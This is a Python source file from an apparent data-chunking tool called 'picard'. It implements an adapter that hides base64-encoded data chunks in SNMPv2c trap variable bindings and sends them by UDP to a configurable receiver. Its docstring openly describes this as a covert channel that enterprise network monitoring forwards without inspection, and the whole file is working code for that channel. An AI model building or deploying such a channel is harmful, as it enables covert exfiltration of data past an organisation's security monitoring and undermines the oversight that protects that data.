"""SNMP Trap adapter — chunks hidden in SNMP trap variable bindings.

Sends chunk data as variable bindings in SNMPv2c traps. Network
monitoring infrastructure forwards these without inspection, making
them an excellent covert channel in enterprise environments.

Requires: UDP socket access.
"""

from __future__ import annotations

import asyncio
import base64
import struct
import uuid
from typing import Sequence

from picard.adapters.base import Adapter, AdapterProfile, StoredChunkRef
from picard.chunker import Chunk


class SnmpTrapAdapter(Adapter):
    """Store chunks as variable bindings in SNMP traps."""

    PICARD_OID = "1.3.6.1.4.1.99999.1"

    def __init__(
        self,
        trap_receiver: str = "127.0.0.1",
        port: int = 162,
        community: str = "public",
        *,
        max_chunk_bytes: int = 1400,
    ) -> None:
        self._receiver = trap_receiver
        self._port = port
        self._community = community
        self._max = max_chunk_bytes
        self._cache: dict[str, str] = {}

    def profile(self) -> AdapterProfile:
        return AdapterProfile(
            name="snmp-trap",
            max_chunk_bytes=self._max,
            persistent=False,
            ordered=False,
            rate_limit_per_min=300,
            ttl_seconds=None,
        )

    @staticmethod
    def _encode_length(length: int) -> bytes:
        if length < 0x80:
            return struct.pack("B", length)
        elif length < 0x100:
            return b"\x81" + struct.pack("B", length)
        else:
            return b"\x82" + struct.pack("!H", length)

    @staticmethod
    def _encode_oid(oid_str: str) -> bytes:
        parts = [int(x) for x in oid_str.split(".")]
        if len(parts) < 2:
            parts = parts + [0] * (2 - len(parts))
        encoded = bytes([40 * parts[0] + parts[1]])
        for p in parts[2:]:
            if p < 128:
                encoded += bytes([p])
            else:
                octets = []
                while p > 0:
                    octets.append(p & 0x7F)
                    p >>= 7
                octets.reverse()
                for i in range(len(octets) - 1):
                    octets[i] |= 0x80
                encoded += bytes(octets)
        return b"\x06" + SnmpTrapAdapter._encode_length(len(encoded)) + encoded

    @staticmethod
    def _encode_octet_string(data: bytes) -> bytes:
        return b"\x04" + SnmpTrapAdapter._encode_length(len(data)) + data

    @staticmethod
    def _encode_integer(value: int) -> bytes:
        if value == 0:
            return b"\x02\x01\x00"
        octets = []
        v = abs(value)
        while v > 0:
            octets.append(v & 0xFF)
            v >>= 8
        octets.reverse()
        if octets[0] & 0x80:
            octets.insert(0, 0)
        data = bytes(octets)
        return b"\x02" + SnmpTrapAdapter._encode_length(len(data)) + data

    def _build_trap(self, chunk_key: str, data: str) -> bytes:
        varbind_oid = self._encode_oid(f"{self.PICARD_OID}.{hash(chunk_key) % 99999}")
        varbind_value = self._encode_octet_string(
            base64.b64encode(data.encode())
        )
        varbind = varbind_oid + varbind_value
        varbind_seq = b"\x30" + self._encode_length(len(varbind)) + varbind
        varbind_list = b"\x30" + self._encode_length(len(varbind_seq)) + varbind_seq

        request_id = self._encode_integer(hash(chunk_key) % 2**31)
        error_status = self._encode_integer(0)
        error_index = self._encode_integer(0)
        pdu_body = request_id + error_status + error_index + varbind_list
        pdu = b"\xa7" + self._encode_length(len(pdu_body)) + pdu_body

        version = self._encode_integer(1)  # SNMPv2c
        community = self._encode_octet_string(self._community.encode())
        message_body = version + community + pdu
        message = b"\x30" + self._encode_length(len(message_body)) + message_body
        return message

    async def write_chunk(self, encoded_chunk: str) -> StoredChunkRef:
        try:
            chunk = Chunk.decode(encoded_chunk)
            chunk_key = f"{chunk.manifest_id}_{chunk.block_index}_{chunk.chunk_index}"
        except ValueError:
            chunk_key = uuid.uuid4().hex

        def _send():
            import socket
            packet = self._build_trap(chunk_key, encoded_chunk)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.sendto(packet, (self._receiver, self._port))
            finally:
                sock.close()

        try:
            await asyncio.to_thread(_send)
        except Exception:
            pass

        self._cache[chunk_key] = encoded_chunk
        return StoredChunkRef(adapter_name="snmp-trap", location=chunk_key)

    async def read_chunk(self, ref: StoredChunkRef) -> str:
        val = self._cache.get(ref.location)
        if val is None:
            raise KeyError(f"SNMP trap not cached: {ref.location}")
        return val

    async def delete_chunk(self, ref: StoredChunkRef) -> bool:
        return self._cache.pop(ref.location, None) is not None

    async def list_chunks(self, manifest_id: str) -> Sequence[StoredChunkRef]:
        prefix = f"{manifest_id}_"
        return [
            StoredChunkRef(adapter_name="snmp-trap", location=k)
            for k in self._cache
            if k.startswith(prefix)
        ]

    async def health_check(self) -> bool:
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.close()
            return True
        except Exception:
            return False

    async def capacity(self) -> dict[str, int | None]:
        used = sum(len(v.encode()) for v in self._cache.values())
        return {
            "used_bytes": used,
            "free_bytes": None,
            "total_bytes": None,
            "chunk_count": len(self._cache),
        }
